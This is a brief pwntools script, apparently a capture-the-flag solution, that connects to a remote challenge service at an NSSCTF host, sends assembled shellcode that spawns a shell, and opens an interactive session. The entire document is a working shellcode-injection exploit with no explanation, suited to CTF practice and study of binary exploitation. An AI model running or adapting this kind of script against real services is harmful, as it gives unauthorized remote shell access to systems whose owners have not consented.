from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node1.anna.nssctf.cn",28995)
# io=process("./pwn")

payload=asm(shellcraft.sh())
io.send(payload)


io.interactive()